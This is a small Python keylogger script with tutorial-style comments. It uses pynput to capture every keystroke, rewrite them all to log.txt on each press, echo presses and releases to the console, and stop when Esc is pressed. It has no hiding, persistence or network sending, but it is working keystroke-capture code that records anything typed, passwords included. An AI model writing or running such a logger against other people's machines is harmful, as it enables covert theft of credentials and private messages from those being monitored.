import pynput #pynput is a library that allows you to control and monitor the keyboard and mouse
from pynput.keyboard import Key, Listener #Key is a class that represents a keyboard key, and Listener is a class that listens for keyboard events

keys = []  #list to store the keys pressed

def on_press(key): #function to handle the press event
    keys.append(key) #append the key pressed to the list
    write_file(keys) #write the keys pressed to a file
    try:
        print("alphanumeric key {0} pressed".format(key.char))  #print the key pressed
    except AttributeError:
        print("special key {0} pressed".format(key)) #print the special key pressed
        

def write_file(keys): #function to write the keys pressed to a file #keys is the list of keys pressed
    with open("log.txt", "w") as f: #open the file in write mode
        for key in keys: #iterate through the list of keys
            k = str(key).replace("'", "") #replace the single quotes with an empty string
            f.write(k) #write the key to the file
            f.write(" ") #write a space to the file

def on_release(key): #function to handle the release event
    print("key released {0}".format(key)) #print the key released
    if key == Key.esc: #if the key pressed is the escape key
        return False #return false to stop the listener

with Listener(on_press=on_press, on_release=on_release) as listener: #create a listener object
    listener.join() #join the listener to the main thread
